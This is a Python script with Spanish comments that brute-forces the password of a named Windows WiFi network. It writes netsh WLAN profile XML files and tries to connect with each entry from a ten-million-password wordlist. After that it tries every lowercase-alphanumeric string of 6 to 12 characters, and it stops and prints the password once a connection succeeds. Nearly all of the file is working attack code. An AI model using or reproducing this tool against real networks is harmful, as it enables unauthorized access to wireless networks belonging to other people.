

import uuid
import socket
import os
import sys
import time
import string
import itertools
from datetime import timedelta
from timeit import default_timer as timer
import ctypes
import subprocess

# Obtén la dirección MAC original
def get_original_mac():
    original_mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2 * 6, 2)][::-1])
    return original_mac

# Obtener la dirección IP
def get_ip_address():
    # Crear un socket
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # Conectarse a un servidor externo (en este caso, Google)
        s.connect(("8.8.8.8", 80))
        # Obtener la dirección IP del socket
        ip = s.getsockname()[0]
    except socket.error:
        ip = "Failed to get IP address"
    finally:
        # Cerrar el socket
        s.close()
    return ip

# Obtener lista de nombres de red disponibles
def get_available_networks():
    networks = []
    try:
        result = subprocess.run(['netsh', 'wlan', 'show', 'networks'], capture_output=True, text=True)
        for line in result.stdout.split('\n'):
            if "SSID" in line:
                ssid = line.split(":")[1].strip()
                networks.append(ssid)
    except Exception as e:
        print(f"Error al obtener las redes disponibles: {e}")
    return networks

# Verificar si el nombre de red está en la lista de redes disponibles
def is_network_available(network_name):
    available_networks = get_available_networks()
    return network_name in available_networks

# Crear XML que se enviará al router
def createXML(file, name='base.xml'):
    with open(name, 'w') as base:
        base.write(file)

# Credenciales de Wifi
def addingCredentials(password, wifiName):
    with open("schema.xml", 'r') as text:
        schema = text.read()
        wifiName = schema.replace('WIFINAME', wifiName)
        createXML(wifiName.replace('WIFIPASSWORD', password))

# Algunos comandos netsh
def commandLineInterfaces(wifiName):
    os.popen(
        f'netsh wlan add profile filename=base.xml interface=Wi-Fi && netsh wlan connect name={wifiName}')
    time.sleep(WAITING_RESPONSE_SECOND)
    return os.popen(f"netsh interface show interface").read().split()

# Contraseñas comunes en txt
def wifiCommonPassword(txt_file):
    with open(txt_file, 'r') as passwords:
        return tuple(passwords.read().split())

# Salida de consola
def outPut(password, index, wifiName):
    addingCredentials(password, wifiName)
    if 'Connected' in commandLineInterfaces(wifiName)[::-1]:
        print(
            f"Password Unlocked: {password} | tried: {index} | duration: {timedelta(seconds=timer()-DURATION)}")
        sys.exit()
    print(f"Fail password: {password} | tried: {index}")

# Cargar todas las contraseñas comunes
def force_brute_txt(txt_file, wifiName):
    DB_PASSWORD = wifiCommonPassword(txt_file)
    for index, password in enumerate(DB_PASSWORD):
        outPut(password, index, wifiName)

# Cada combinación de 6 a 12 caracteres usando [a,b,c,d,e,f....z] y [0,1,2,3,4....9]
def guess_password(wifiName):
    chars = string.digits + string.ascii_lowercase
    index = 0
    for password_length in range(6, 13):
        for guess in itertools.product(chars, repeat=password_length):
            index += 1
            guess = ''.join(guess)
            outPut(guess, index, wifiName)

# ------------------------------------Script------------------------------------------

if len(sys.argv) < 2:
    print("Uso: python main.py <nombre_red>")
    sys.exit(1)

network_name = sys.argv[1]
TXT = '10-million-password-list.txt'  # Definición de la variable TXT
WAITING_RESPONSE_SECOND = 1  # Router need to send if it's connected
DURATION = timer()  # How long it takes

if not is_network_available(network_name):
    print(f"La red '{network_name}' no está disponible.")
    sys.exit(1)

original_mac = get_original_mac()
print("Original MAC address:   ", original_mac)

my_ip = get_ip_address()
print("Original IP address:    ", my_ip)

force_brute_txt(TXT, network_name)
guess_password(network_name)